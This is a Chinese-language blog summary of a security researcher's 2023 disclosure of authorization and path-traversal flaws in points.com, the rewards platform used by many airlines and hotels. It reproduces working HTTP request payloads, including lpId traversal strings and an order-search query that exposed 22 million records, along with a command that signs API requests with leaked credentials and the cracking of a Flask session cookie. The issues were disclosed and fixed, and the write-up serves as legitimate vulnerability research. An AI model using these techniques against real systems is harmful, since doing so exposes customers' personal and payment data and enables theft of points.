# 2023-08-31：筆記 samcurry 的 Hacking the Largest Airline and Hotel Rewards Platform.md
## samcurry (samwcyo), August 3, 2023
### Ref https://samcurry.net/points-com/

----------------

這篇內容的工作，除了 samcurry 之外，還有其他 collaborators
- Ian Carroll (https://twitter.com/iangcarroll)
- Shubham Shah (https://twitter.com/infosec_au)

另外有 Special thanks:
- Nick Wright for the amazing cover image (https://instagram.com/nick99w)
- Daniel Ritter (https://twitter.com/_danritter)
- Brett Buerhaus (https://twitter.com/bbuerhaus)
- Samuel Erb (https://twitter.com/erbbysam)
- Joseph Thacker (https://twitter.com/rez0__)
- Gal Nagli (https://twitter.com/naglinagli)
- Noah Pearson

----------------

## 簡介
`2023/03 ~ 2023/05`，我們在 `points.com` 發現多個安全漏洞
- 該網站是相當一部分航空公司和酒店獎勵計劃的後台提供者
- 這些漏洞讓攻擊者存取敏感的客戶帳號訊息，包括姓名、帳單地址、經編輯的信用卡詳細資訊、電子郵件、電話號碼和交易記錄
- 此外，攻擊者還可以利用這些漏洞執行一些操作，例如從客戶帳號轉移積分和未經授權存取 global administrator website
- 這種未經授權的存取將授予攻擊者發放積分、管理獎勵計劃、監督客戶帳號和執行各種管理功能的全部權限

報告這些漏洞後，`points.com` 團隊迅速做出反應
- 在一小時內確認了每份報告
- 迅速將受影響網站下線，進行徹底調查，並隨後修補了所有發現的問題

下面先從概述這些漏洞，技術方面的內容在更後面  


----------------


## Directory Traversal 導致 Query 存取 `Points.com` 客戶訂單記錄 (2023/03/07)
第一份報告是 unauthenticated HTTP path traversal
- 允許存取內部 API，從而允許攻擊者從一組 2200 萬條訂單記錄中查詢條目
- 記錄中的資料包括部分信用卡號、家庭住址、電子郵件地址、電話號碼、獎勵積分號碼、客戶授權代幣和其他交易細節
- 這些資訊可透過 API 呼叫查詢，每次請求可傳回 100 個結果
  - 透過排序參數，攻擊者可以列舉資料或查詢特定資訊(如搜尋客戶姓名或電子郵件地址)

----------------


## 只使用獎勵編號和姓氏就能轉移獎勵積分並洩露客戶資訊 (2023/03/07)

第二個漏洞是 authorization bypass
- 攻擊者只需知道其他用戶的姓氏和積分編號(這兩個資訊都能在第一個漏洞中取得)，就可以透過配置不當的 API 從其他用戶轉移積分
- 攻擊者可以產生完整的帳號 authorization tokens，從而可以管理客戶帳號、查看訂單歷史記錄、查看帳單資訊、查看聯絡資訊以及從客戶轉移積分

----------------


## `Virgin Rewards Program` 的 Tenant Credentials 洩露，攻擊者可以代表 `Virgin` 簽署 API request (Add/Remove Rewards Points, Access Customer Accounts, Modify Rewards Program Settings, etc.)


2023/05/02，我們在由 `points.com` 託管的 `Virgin rewards` 網站上發現了一個 endpoint
- 該 endpoint 洩露了 Virgin 用來代表航空公司驗證核心 `points.com` API 的 `macID` 和 `macKey`
- 這些憑證可用於以航空公司的身份對 `lcp.points.com` API 進行完全驗證
- API 的完全身份驗證，允許攻擊者呼叫航空公司的任何 API，例如修改客戶帳號、新增/刪除積分或修改與 Virgin rewards program 相關設定

----------------


## 從 United MileagePlus 會員處轉移航空哩程及存取客戶帳號及訂單資訊的新方法 (2023/04/29)

2023/04/29，又發現了第四個漏洞，主要影響美國聯合航空公司
- 攻擊者只需知道用戶的獎勵編號和姓氏，就可以為任何用戶產生 authorization token
- 透過這個問題，攻擊者可以向自己轉移里程，也可以在與 MileagePlus 的多個相關 application 上以會員身份進行驗證
  - 其中可能包括 MileagePlus administrator panel
- 這個問題洩露了會員的姓名、帳單地址、經編輯的信用卡資訊、電子郵件、電話號碼和帳號上的過往交易

----------------

## 透過脆弱的 Flask Session Secret 完全存取 Global `Points.com` Administration Console 和忠誠度錢包 Administration Panel (2023/05/02)


2023/05/02，我們發現用於管理所有航空公司租戶和客戶帳號的 `points.com` global administration 網站的 Flask session secret 是 `"secret"`
- 發現這漏洞後，我們使用超級管理員的全部權限 resign 了 session cookie

在用完全管理員權限的角色 resigning cookie 後
- 我們發現可以存取網站上的所有核心管理功能，包括使用者查詢、手動獎勵、獎勵積分轉換修改
  - (例如，設定兩個計劃之間的兌換率，1 點積分可以兌換 100 萬點積分)
- 以及更多 `points.com` 管理 endpoints(如，管理促銷、品牌、重置忠誠度計畫憑證等)
- 攻擊者可以濫用存取權限，撤銷現有的獎勵計劃憑證，並暫時關閉航空公司獎勵功能


對於我們上一次報告的漏洞，該團隊在一小時內就做出了回應(儘管是在凌晨 3:30 報告的)，將網站下線並更改了 secret

----------------

## 調查 `Points.com`
`credit card churning`:
- (這個詞中文還沒有常見的翻譯，有的翻信用卡套現。總之就是信用卡回饋的一種)
- 在這個圈子裡，你可以嘗試將信用卡和消費遊戲化，以節省積分，而積分可以兌換成機票和飯店等物品
- 從駭客的角度來看，看到儲存數值的系統離實際貨幣的使用只有一步之遙
- 真是超級有趣。我使用這些系統越多，就越有興趣弄清楚它們是如何運作的，以及究竟是什麼系統推動了積分獎勵產業的發展

我發了訊息給 `Ian Carroll`
- 他在黑客攻擊航空公司方面有著豐富的經驗
- 同時還經營著 [seats.aero](https://seats.aero/) 的航空公司積分預訂網站
- 聊了後，我們又拉來了另位在航空公司獵殺多年的黑客 Shubham Shah，目標是找到影響積分獎勵生態系統的安全漏洞


當我們開始研究時，我們發現一家名為 `points.com` 的公司是全球幾乎所有主要獎勵計劃的提供者
- 我搭乘過的每家航空公司都使用 `points.com` 作為儲存和處理獎勵積分的後台
- 他們似乎是這一領域的領導者，他們的網站上甚至有一個 [security.txt](https://www.points.com/.well-known/security.txt) 頁面


----------------

## 這一切是如何運作的？
我們在 Github 上搜尋了幾個小時並閱讀了 `points.com` 的文件後
- 發現 `lcp.points.com` 網站上有個供獎勵計劃使用的 API
- 在查看 public repositories 時，我們發現了一個看起來像是 `lcp.points.com` API 文件的連結
- 但該文件已從互聯網上刪除。幸運的是，**我們在 archive.org 上找到了它的副本**


存檔的 API 文件描述了積分獎勵計畫認證使用者、獎勵積分、轉讓積分、消費積分等的方法  
![](https://lh6.googleusercontent.com/_2P5YI18OR4quqRkLmkt4Tv14a9l9dCVUxkTB6lEJy_gF6OAcpjfonYrIrBo3G4V2HhqdINnzP3Pg2uthj5Qf9hsBea1j9Kxt4I-gxOVKtVybMSOsfoD6p6EkObXdl9gPuwdY1On04XTMjdIzI7kuIc)  


我們最初的想法是「如何取得使用 API 的權限代表獎勵計劃？」
- 經過一番探索，我們找到了 `console.points.com` 網站
- 該網站允許獎勵計劃進行公開註冊，建立必須經過人工批准的帳號


![](https://lh4.googleusercontent.com/7P2e-03SgzlTI8xxmn6X21f2ugydyrvRZ56u5YuHQhdrep-YcstLblWCpzwAvCkKasm0WUciJplWHgwPpYn384IZed6KMobHrmAtQ_Hcw3tdpjbt6URYpZljMd9uRbUgsYRQ6rvpVve69ARF2HGh6iA)  

在對該入口網站進行身份驗證後，我們發現這是獎勵計劃的 administration console
- 他們可以在這裡初始化和管理 OAuth 類型的 application
- 這些 application 都有 API keys，可與 `LCP API`(Loyalty Commerce Platform)互動
- 而 `LCP API` 就是 `lcp.points.com` 在 host 的


接下來
- 我們檢查了控制 dashboard 的 JavaScript
- 我們發現，`console.points.com` 似乎被 `points.com` 員工用來執行有關客戶帳號、獎勵計劃的管理操作，以及管理網站本身




獎勵計劃用於管理積分和客戶帳號的獎勵計劃 API (lcp.points.com) 需要兩個 key 才能與之互動
- 這兩個 key 在註冊 `console.points.com` 網站時都已分發:
  - `macKeyIdentifier`: essentially an `OAuth` `client_id`
  - `macKey`: essentially an `OAuth` `client_secret`


使用在 `console.points.com` 上註冊 app 時獲得的上面兩個 key，就能透過 `OAuth 2.0 MAC` 身份驗證方案簽署指向 `lcp.points.com` 的HTTP request，並呼叫忠誠度平台 API
 

![](https://lh5.googleusercontent.com/5zYgRBbnCgkIJI4sh1Y3TaiUopPSGq4gg3SUHaAay1zmHfZKYEcq4WN7jF6OEA_oe2DYWEJcYa3pYBYVaqWSXrDIHbIzS5CmBb-YE41QFv3h861mNt3_Ef57JONW_H240qzkdcOOzDoP1WJPnzs53bM)  
 
事實上，該平台採用這種形式的授權有點令人沮喪
- 因為這意味著我們必須寫一個用於簽署 HTTP request 的封裝程式來 fuzz API
- 而且 secret key 不會包含在獎勵計劃發送的 HTTP request 中
- 例如，如果在航空公司程式中發現了 SSRF 這樣的漏洞，key 本身不會洩漏給我們，洩漏的只是航空公司試圖發出的特定 HTTP request 的簽名


我們對 API 進行了長時間的模糊測試(使用 Python script 手動簽署每個 HTTP request)
- 但未能發現任何一次性授權漏洞
- 要找到其他航空公司專案的數位 ID 並不難，但遺憾的是，我們無法找到任何基本的核心 API 漏洞，如 IDOR 或權限升級
- 我們決定改變路線，以便更了解公開上市的客戶獎勵計畫是如何使用 `points.com` 基礎架構的




----------------

## 探索 United Airlines Points Management 網站
由於 `United Airlines` 用 `points.com` 實施其獎勵計劃
- 我們認為測試它與 `points.com` 整合的 application 會很有趣
- 我們發現了以下用於購買、轉讓和管理 MileagePlus 里程的 MileagePlus domain


```
https://buymiles.mileageplus.com/united/united_landing_page/#/en-US
```


對網站進行了一段時間的摸索後
- 我們很快就發現 `buymiles.mileageplus.com` 實際上是由 points.com host 的，而不是 United Airlines
- 我們對該網站如何從授權角度運作產生了極大的好奇，並開始測試網站的預期功能

![](https://lh4.googleusercontent.com/1XGVc3pi9VRxJ_XKj8sZ8Cz0HDcZAXzx-IsyFv_TrBPRkajKtQdoxnnY7AngtJBJLPKQguuCGni6dsje1ulngL8kqBSXWEg6fYvuMRlHng4dgvLDsGixIZZ8WzwbqjY1erEfLxjBDHUO7gbck_MoMwk)  


我們繼續正常使用 `buymiles.mileageplus.com` 網站，並在嘗試購買里程後觀察到以下流程:

1. 在 `buymiles.mileageplus.com` 點選 `Buy miles`
2. 觀察到被 redirect 到 `www.united.com`，在此使用我們的 United MileagePlus 的 username/password 驗證 OAuth 的流程
3. 觀察你透過 `redirect_uri` 參數被 redirect 到 `buymiles.mileageplus.com`
4. 然後用在 `www.united.com` 上，用我們 username/pwssword 進行身份驗證時獲得的 authorization token 發以下 HTTP request:
    **HTTP Request:**  
    ```
    POST /mileage-plus/sessions/sso HTTP/2
    Host: buymiles.mileageplus.com
    Content-Type: application/json

    {"mvUrl":"www_united_com_auth_token"}
    ```

    **HTTP Response:**  
    ```
    HTTP/2 201 Created
    Content-type: application/json

    {"memberValidation": "points_com_user_auth_token"}
    ```

5. 使用從上面 HTTP response 中傳回的 `memberValidation` token，向下面 endpoint 傳另一個 HTTP request，其中 `memberDetails` 是傳回的 `memberValidation` token:

    **HTTP Request:**
    ```
    POST /payments/authentications/ HTTP/2
    Host: buymiles.mileageplus.com
    Content-Type: application/json

    {"currency":"USD","memberDetails":"points_com_user_auth_token","transactionType":"buy_storefront"}
    ```

    **HTTP Response:**  
    ```
    HTTP/201 Created 
    Content-type: application/json

    {"email": "example@gmail.com", "firstName": "Samuel", "lastName": "Curry", "memberId": "EH123456"}
    ```

完成 OAuth-type flow 後，`memberValidation` token 似乎變成了 `points.com` 航空公司租戶的 user authorization token
- 我們可以重複使用此 token 執行 API 呼叫並驗證使用者身分


如果我們能為其他用戶產生這個 token
- 我們就能在他們的帳號上執行操作，如轉移航空里程和搜索他們的個人資訊
- 隨著我們對航空公司網站如何利用 `points.com` 基礎設施有了更多的了解，這成為了我們的目標之一，也是我們進一步探索的內容


----------------

## 1. `Points Recipient` endpoint 上不正確的 Authorization 允許攻擊者僅使用姓氏和獎勵編號以任何使用者身分進行驗證
當我們繼續尋找可以洩漏他人 `memberValidation` token 時，我們在 United 網站上發現了名為 `Buy miles for someone else(為他人購買里程)` 的流程
 

![](https://lh4.googleusercontent.com/bjX3VX9MG4yLqSrq_JjoXc0y4rjPGpgiZUmbeGZTwtuBI4uCzW9ZeLBE4OYAExUkZgEi4Wsp1yC0CfhCwdnHfTAksQrc9B1TBDDzx-JHtDwRUV22tdvaIxcViLj8CKsM8l-fh_6rIMYEXuP35fNxnaI)  

When you landed on this page as an authenticated MileagePlus user, it would ask you to add a recipient to send miles to. The recipient input field took in a first name, last name, and a MileagePlus number. When we sent the HTTP request to add the recipient, we noticed something super interesting returned in the response:

當你以經過驗證的 MileagePlus user 身分登入此頁面時
- 它會要求你新增一個收 recipient 傳送哩程
- recipient 輸入欄位包括名字、姓氏和 MileagePlus number
- 當我們發送 HTTP request 新增 recipient 時，我們注意到 response 中回傳了一些非常有趣的內容:

**HTTP Request:**  
```
POST /mileage-plus/mvs/recipient HTTP/2
Host: buymiles.mileageplus.com
Content-Type: application/json

{"mvPayload":{"identifyingFactors":{"firstName":"Victim","lastName":"Victim","memberId":"EH123456"}},"lpId":"loyalty_program_uuid"}
```

**HTTP Response:**  
```
HTTP/2 201 Created
Content-type: application/json

{"memberId": "EH123456", "links": {"self": {"href": "points_com_user_auth_token"}}, "membershipLevel": "1"}
```



HTTP response 包含了會員的 authorization token
- 我們之前了解到該 token 用於搜索會員資訊並代表會員轉換里程


這個漏洞是這樣運作的:
- 透過正常的網站 UI 加入積分 recipient，發送他們的名字、姓氏和獎勵號碼
- 伺服器就會在 HTTP response 中傳 authorization token，**用來搜索他們的**帳單地址、電話 號碼、電子郵件、經編輯的信用卡資料和帳單歷史記錄
- 此外，我們也可以使用該 token 來代表他們轉移里程


要使用洩漏的 token，我們只需將其插入網站上的任何 API 呼叫，就可以執行轉移里程或簡單搜索會員 PII 等操作
- 我們只要知道受害者的姓氏和獎勵積分編號，就能完全驗證受害者帳號的身份！



![](https://samcurry.net/wp-content/uploads/2023/08/3_screenshot.png)  


----------------


## 將問題升級來影響其他獎勵計劃
在發現只需知道客戶的姓氏和獎勵點數就能訪問客戶帳號後
- 我們很好奇 `buymiles.mileageplus.com` 網站上是否還有其他 endpoint 存在類似的權限問題，但不需要我們知道客戶的任何前提資訊


我們注意到，在產生會員 authorization tokens 的 HTTP request 中有個名為 `lpId` 參數
- 根據 `LCP API` 文件，此參數是 `loyalty program UUID`(如達美航空、美聯航、西南航空等)
- 美聯航網站上的 API 似乎與達美航空或阿聯酋航空等其他計劃使用的 API 相同


透過將第一個漏洞中的 `loyalty program UUID` 和用戶獎勵編號與另一個計劃的 UUID 和用戶獎勵編號互換
- 我們驗證了可以利用這個漏洞訪問其他獎勵計劃的客戶帳號
- 如果我們將 `loyalty program UUID` 和獎勵編號換成 Delta 客戶的，它就會在不同的獎勵計劃中向受害者返回授權代幣


有趣的是，這種行為還表明，這是在攻擊通用的 `points.com` API
- 它似乎與所有忠誠度計劃都有關聯，而不僅僅是美國聯合航空



![](https://samcurry.net/wp-content/uploads/2023/07/delta-skymiles.png) 



在將問題升級到為任何航空公司產生 authorization tokens 後
- 我們開始對有漏洞的 HTTP request 進行 fuzz，並很快發現忠誠度計畫 UUID 參數正作為 HTTP path 參數被送到 proxied HTTP server
- 我們是觀察在 `loyalty program UUID` 參數末尾新增問號和 pound symbol 時的奇怪行為發現這一點的
- 這種行為破壞了 server 發的 HTTP request


**HTTP Request:**  
```
POST /mileage-plus-transfer/mvs/recipient HTTP/1.1
Host: buymiles.mileageplus.com

{"mvPayload":{},"lpId":"0ccbb8ee-5129-44dd-9f66-a79eb853da73#"} <-- pound symbol appended
```

**HTTP Response:**
```
HTTP/1.1 400 Bad Request
Content-type: application/json

{"error":"Cannot process type 'text/html', expected 'application/json'"}
```


我們立即猜測，`lpId` 參數被送到了 `lcp.points.com` API
- 在我們新增問號後，它將破壞 HTTP response，從而使後台無法解釋來自第二個伺服器的 HTTP response
- 我們試著透過猜測 `loyalty program UUID` 前後的目錄來確認這一點，看看 API 是否仍能正常運作


經過一段時間的測試，我們驗證了以下每個 payload 都能讓我們正常新增 recipient
- 從而驗證 HTTP request 實際上是代理到第二個 HTTP server 的
- 透過閱讀 `LCP API` 文件，發現許多帶有 `loyalty program UUID` 的 HTTP request 的前一個目錄為 `lps`，後一個目錄為 `mvs`
- 透過傳送這些附加目錄並接收正常的 200 OK HTTP response，意味著我們可以在 API 上進行遍歷，並有可能存取其他 API endpoint



```
"lpId":"/0ccbb8ee-5129-44dd-9f66-a79eb853da73"
"lpId":"/../lps/0ccbb8ee-5129-44dd-9f66-a79eb853da73"
"lpId":"0ccbb8ee-5129-44dd-9f66-a79eb853da73/mvs/?"
"lpId":"/../lps/0ccbb8ee-5129-44dd-9f66-a79eb853da73/mvs/?"
```


根據我們對 `LCP API OAuth 2.0 MAC` 驗證方案的瞭解，如果這些二級 context HTTP request 指向 `lcp.points.com`
- 則需要使用特定客戶的 `macKey` 和 `macID` 參數進行簽署

然而，非常奇怪且有趣的是
- 這個 HTTP request 能夠為任何獎勵計劃產生 authorization tokens
- 當我們嘗試使用已設定的 `lcp.points.com` 憑證來產生授權權杖時，卻收到了授權錯誤提示，表示我們沒有存取特定路由的權限


看到 HTTP request 可以為任何獎勵計劃產生 authorization tokens 後
- 我們首先想到的是，`points.com` United 網站(由 `points.com` 建立和託管)在發送 HTTP request 以產生 `points.com` 會員 authorization tokens 時， 使用了一個 god token 作為授權承載器，可以存取所有獎勵計劃



如果情況確實如此，而且我們可以遍歷 API，那麼我們就可以將整個 POST request 重寫到任何具有 global 權限的 `lcp.points.com` endpoint
- 我們新的興趣點是找到一個可以遍歷的 endpoint，以便測試 HTTP request 是否真的由 god token 簽署


----------------


## 2. 透過對有權限 API 的 Directory Traversal，存取 `Points.com` 獎勵計畫的 2,200 萬筆客戶訂單記錄
為了驗證我們的理論，即二級 context API 可能使用了具有 global 權限的 authorization token
- 我們試圖找到可以 traversal 並覆蓋整個 API 呼叫的其他 endpoint，以便控制整個 HTTP request 
- 從 `LCP API` 文件中取得 endpoint list 後，我們設定 `intruder` 來執行，該設定會對特定 endpoint 進行測試，並附加 `？` 以切斷剩餘路徑


例如，為了找到 `/api/example` 的正確目錄，我們發送了以下 `lpId` payload: 
```
"lpId":"/api/example?"
"lpId":"../api/example?"
"lpId":"../../api/example?"
```


最終，我們得到了以下 payload 的第一個 200 OK HTTP response:  
- (不知道為什麼作者說這是 200 OK response)
 
**HTTP Request:**  
```
POST /mileage-plus-transfer/mvs/recipient HTTP/1.1
Host: buymiles.mileageplus.com

{"mvPayload":{},"lpId":"../../v1/search/orders/?"}
```

**HTTP Response:**  
```
HTTP/2 400 Bad Request
Content-type: application/json

{"error":"Missing query parameter"}
```


看到 `missing query parameter` 後
- 我們嘗試透過 `lpId` 參數對 GET parameter 進行 fuzz
- (例如，`/v1/search/orders?query=x`)，但無法辨識任何內容
- 這讓我們困惑了一會兒，然後我們意識到 `/v1/search/orders` 是接收 JSON 的 POST request


我們看到了發送的空參數 `mvPayload`，並嘗試對 JSON 中的參數進行 fuzz
- 執行我們 `intruder` script，然後我們看到了一個成功的 script，其 response 大小非常大！ 參數 `q` 似乎就是 server 正在尋找的參數


透過發送以下 POST request，我們能夠存取所有 `points.com` 忠誠度計畫的交易數據
- 包括達美航空、阿聯酋航空、新加坡航空、美聯航、阿提哈德航空、加拿大航空、漢莎航空、西南航空、阿拉斯加航空、夏威夷航空，以及希爾頓、萬豪和IHG 等許多飯店積分供應商:
 


**HTTP Request:**  
```
POST /mileage-plus-transfer/mvs/recipient HTTP/1.1
Host: buymiles.mileageplus.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Content-Type: application/json
Content-Length: 59
Connection: close

{"mvPayload":{"q":"*"},"lpId":"../../v1/search/orders/?"}
```

**HTTP Response:**  

```
HTTP/1.1 200 OK
Date: Fri, 10 Mar 2023 00:02:04 GMT
Content-Type: application/json

{
  "orders": [
    {
      "payment": {
        "billingInfo": {
        "cardName": "Visa",
        "cardNumber": "XXXXXXXXXXXXXXXX",
        "cardType": "VISA",
        "city": "REDACTED",
        "country": "US",
        "expirationMonth": 7,
        "expirationYear": 2023,
        "firstName": "REDACTED",
        "lastName": "REDACTED",
        "phone": "REDACTED",
        "state": "TX",
        "street1": "REDACTED",
        "zip": "REDACTED"
      },
      "costs": {
        "baseCost": 275,
        "fees": [],
        "taxes": [],
        "totalCost": 275
      },
      "currency": "USD",
      "type": "creditCard"
    },
    "user": {
      "balance": 94316,
      "email": "REDACTED",
      "firstName": "REDACTED",
      "lastName": "REDACTED",
      "memberId": "REDACTED",
      "memberValidation": "https://lcp.points.com/v1/lps/LOYALTY_PROGRAM_ID/mvs/MEMBER_TOKEN",
      "membershipLevel": "1"
    },
    "flightBookingDetails": {
      "destinationCode": "MDW",
      "destinationName": "Chicago (Midway), IL - MDW",
      "originCode": "SDF",
      "originName": "Louisville, KY - SDF",
      "roundTrip": true
    }
  }
],
"totalCount": "22745869"
}
```


看到 HTTP response 後，我們立即報告了這個問題
- 我們可以從不同的航空公司和酒店獎勵計劃中查詢到超過 2200 萬筆記錄
- 簽署 HTTP request 的 `macKey` 和 `macID` 似乎是種萬能鑰匙，可以存取所有獎勵計劃的資料
- 該漏洞影響了所有 [幾乎所有 `points.com` 客戶](https://www.points.com/partners/)

**`Points.com` Catches Us:**  
我們還來不及發送報告或查看其他 endpoint 是否可以訪問(例如向客戶獎勵帳號新增積分)，points.com 團隊就發現了我們的測試
- 並完全關閉了美聯航的 production `points.com` 網站
- 如果我們是惡意行為者，我們就會在試圖透過該漏洞枚舉大量記錄(每次查詢傳回 100 筆記錄)時被發現
- `points.com` 團隊的偵測和回應令人印象深刻

在對 `points.com` 基礎設施**進行了幾天的測試後**
- 我們對找到一個可以讓我們複製或產生無限里程的漏洞越來越感興趣
- 在 `buymiles.mileageplus.com` 網站關閉的同時，我們開始探索 `points.com` 基礎架構的其他部分

 



----------------


## 3. Virgin Rewards Program 證書洩露，攻擊者可代表 Virgin 簽署 API request、新增/刪除獎勵積分、訪問客戶帳號
在對 `points.com` asset 進行測試的過程中
- 我們發現了 Virgin Rewards Program 在合作夥伴網站 `shopsaway.virginatlantic.com` 購物時用來賺取積分的網站

![](https://samcurry.net/wp-content/uploads/2023/08/image1.png)  


我們對這個網站很感興趣
- 因為它是由 `points.com` 託管的，很可能利用了 `points.com` 或 Virgin 公司的憑證來存取與其計劃相關的資訊
- 我們用 discovery tools，發現各種 PHP endpoint，包括一個傳回以下資訊的 `login1.php` endpoint


![](https://samcurry.net/wp-content/uploads/2023/08/image2.png)  


在 `login1.php` 中，似乎有測試獎勵會員的個人資料資訊和各種 key
- 所揭露的 key 包括客戶的 authorization token
- 更有趣的是，`macID` 和 `macKey`，我們認為這是 Virgin 的 `points.com` production 租戶帳號！


根據我們對 `lcp.points.com` API 的理解
- 我們可以使用這些 secret 代表航空公司存取 API
- 我們尋找一種方法來驗證這一點。在網路上搜尋了一段時間後，我們發現了以下程式碼，可以拿來用洩漏的憑證對 `lcp.points.com` API 的 HTTP request 進行簽署


```py
if __name__ == '__main__':
    if '-u' not in sys.argv:
        exit("Usage: %s -u <macKeyIdentifier>:<macKey> [curl options...] <url>" % os.path.basename(__file__))
```

我們可以用下面語法向 `lcp.points.com` 發送 Virgin 簽署的HTTP request API:
- https://github.com/xnt/Loyalty-Commerce-Platform/blob/0d9878bc29bae7c42e808b19865f6b91e1a02079/util/lcp_curl.py#L4


```shell
python lcp_curl.py -u MAC_ID:MAC_SECRET "https://lcp.points.com/v1/search/orders/?limit=1000"
```


執行 script，代表 Virgin program 向 `/v1/search/orders` endpoint 簽署 HTTP request 後，我們收到了:

```json
{
  "orders": [
    {
      "payment": {
      "billingInfo": {
      "cardName": "Visa",
      "cardNumber": "XXXXXXXXXXXXXXXX",
      "cardType": "VISA",
      "city": "REDACTED",
      "country": "US",
      "expirationMonth": 4,
      "expirationYear": 2023,
      "firstName": "REDACTED",
      "lastName": "REDACTED",
      "phone": "REDACTED",
      "state": "CA",
      "street1": "REDACTED",
      "zip": "REDACTED"
    }
  ...
  ],
  "totalCount": "2032431"
}
```

成功了！這驗證了洩漏的憑證是有效的，可以用來存取 Virgin rewards program
- 攻擊者可以使用這些憑證存取任何 `lcp.points.com` endpoint，包括管理 endpoint，例如新增/刪除客戶的獎勵積分、存取客戶帳號以及修改與 Virgin rewards program 相關的租戶資訊
- 我們報告了這個問題，endpoint 在一小時內被移除
 


----------------

## 4. `widgets.unitedmileageplus.com` 上的 Authorization Bypass 允許攻擊者透過姓氏和獎勵編號以任何使用者身分進行身分驗證，有可能存取 United MileagePlus Administration Panel
在美聯航 bug bounty program，有幾個 domain 被明確排除在範圍之外
- 其中包括 `mileageplus.com`
- 我們猜測它們被排除在外的原因是，許多 `mileageplus.com` subdomain 實際上是由 `points.com` 提供支援的


一個 subdomain 是 `widgets.unitedmileageplus.com`
- 它為 United MileagePlus 會員提供某種 SSO 服務
- 用於驗證 `buymiles.mileageplus.com` 和 `mpxadmin.unitedmileageplus.com` 等 application
 

![](https://lh6.googleusercontent.com/J395vvYbOA_2pwL51HFCYb1mRcsjp_olCQ8qXJL61Df70Aa8QHl246yYM-KpHMWALhhW_ahek6mJSssMgSvWzk3e_q9b07I-tCUq2RA9eieFFvLjO7picW025X9TLYeAcjQpU6mDM0CeAoOt2xQvwDY)  



使用 `gau` 列舉 subdomain 後，我們發現有各種登入頁面可以驗證你進入相關的 MileagePlus application
- 每個登入頁面都需要不同的參數：有些會要求你提供 MileagePlus 編號和密碼，有些則會要求你提供 name/pass 和安全問題答案
- 還有一種非常奇怪的形式，只要求你提供 MileagePlus 編號和姓氏


![](https://samcurry.net/wp-content/uploads/2023/08/2_screenshot.png)  


我們發現
- 不同授權方法傳回的 token 格式完全相同
- 我們測試後發現，可以從 HTTP response 複製 token
- 在 HTTP response 中，你只需使用姓氏和 MileagePlus 編號進行身份驗證，然後將 token 從更安全的使用者名稱、密碼和安全問題 endpoint 複製到 consumer endpoints，你就可以透過身份驗證進入任何 application
- 這意味著存在 authorization bypass，我們可以跳過使用會員憑證登入帳號，而只提供他們的姓名和 MileagePlus 編號




從影響的角度來看，透過這個 bypass 可以訪問各種 application
- 包括 `buymiles.mileageplus.com`，該 application 披露了 PII 並允許我們將里程轉移給自己
- 我們繼續使用這個漏洞將里程從我們自己的一個帳號轉移到另一個帳號，證明使用這個 authorization bypass 轉移另個用戶的里程確實是可能的

![](https://samcurry.net/wp-content/uploads/2023/08/1_screenshot.png)  


我們(有可能)驗證過的另個更有趣的 application 是 `mpxadmin.unitedmileageplus.com` 網站
- 我們無法確認這一點，因為在發現問題時，我們沒有可能訪問過該 application 的美聯航員工的姓氏和 MileagePlus 號碼
- 如果我們有，我們認為這是可能的，而且這種級別的存取權限將允許我們管理客戶的餘額、查看交易和執行 MileagePlus 獎勵計劃的管理操作

  



![](https://lh4.googleusercontent.com/B-JKV_3M4-qNFEKQcVRStwTDTeMjc7cAXIIddRu5J_m1Eu8k8x5PcQlISMEc_EuGs6p4N_nyfvO4rYA57p74i1xr-eG2uBiOLDrqaUjXdPQriQx6PeOm_2PgV5hdWPh8V1mPas_hcYNANxYhJvHCCjY)  



**由於我們無法確認這一點，所以繼續尋找更關鍵的東西:**
對我們來說，最重要的是能夠產生無限里程
- 我們永遠無法真正利用它(從道德角度)，但只要找到一種方法，讓我們免費乘坐頭等艙航班、入住五星級酒店、乘坐遊輪和享用美食，我們就會堅持


**轉回 `Points.com` Global Administration Console 進行測試:**  
在意識到我們無法在航空公司網站上進行更深入的探索後，我們將重點轉回到我們發現的原始網站上
- 該網站供 `points.com` 員工和獎勵計劃所有者用於管理客戶和獎勵計劃
- 我們在 `console.points.com` 網站的 JavaScript 中看到，有大量 endpoint 只有 `points.com` 員工才能存取
- 我們又對這些 endpoint 進行了幾個小時的測試，試圖找到任何 authorization bypass 的方法，但都以失敗告終
- 在我們沮喪地嘗試升級權限又過了一段時間後，我們放大了視野，發現了一些我們一直忽略的明顯問題


----------------



## 5. 透過脆弱的 Flask Session Secret 完全存取核心 `Points.com` Administration Console 和 Loyalty Admin 網站
在我們最終停止測試 API 和查找權限漏洞後，我們發現我們完全忘記了查看 sesseion cookie !!



根據 cookie 的格式
- 我們可以看出它是一個奇怪的加密 blob，因為它的格式看起來像 JWT
- 我們又花了一些時間，最後發現核心 application 的 session token 是個已簽署的 Flask session cookie
  - (Python Flask)

```
session=.eJwNyTEOgzAMBdC7eO6QGNskXCZKrG8hgVqJdEPcvX3ru6n5vKJ9PwfetFHCiCqwtYopo4NLiPOo4jYMuhizpJLV8oicilQF_qOeF_a104taXJg7bdHPiecHfX8ccg.ZFCriA.99lOhq3pO8yBWM7XjBshaKjqPKU
```



我們用 ["cookiemonster"](https://github.com/iangcarroll/cookiemonster) 測試看看 cookie
- 這個工具會自動猜測用於簽署 cookie 的秘密，並嘗試用已知秘密的單字表取消簽署
- 幾秒鐘後，我們得到了回應！


```shell
zlz@htp ~> cookiemonster -cookie ".eJwNyTEOgzAMBdC7eO6QGNskXCZKrG8hgVqJdEPcvX3ru6n5vKJ9PwfetFHCiCqwtYopo4NLiPOo4jYMuhizpJLV8oicilQF_qOeF_a104taXJg7bdHPiecHfX8ccg.ZFCriA.99lOhq3pO8yBWM7XjBshaKjqPKU"
🍪 CookieMonster 1.4.0
ℹ️ CookieMonster loaded the default wordlist; it has 38919 entries.
✅ Success! I discovered the key for this cookie with the flask decoder; it is "secret".
```


`points.com` 員工用來管理所有獎勵檔案、忠誠度計畫和顧客訂單的網站的 Flask session secret 是 `"secret"` 這個字
- 理論上，只要伺服器不在 cookie 中包含一些不可預測或已簽署的資料，我們就可以用我們想要的任何資料來簽署我們自己的 cookie
- 我們驗證了網站，並將 session cookie 複製到 flask-unsign，以調查 cookie 的內容:
  - (https://github.com/Paradoxis/Flask-Unsign)

```json
{
   "_csrf_token":"redacted",
   "_fresh":true,
   "_id":"redacted",
   "_user_id":"redacted",
   "sid":"redacted",
   "user":{
      "authenticationType":"account",
      "email":"samwcurry@gmail.com",
      "feature_flags":["temp_resending_emails"],
      "groups":[],
      "id":"redacted",
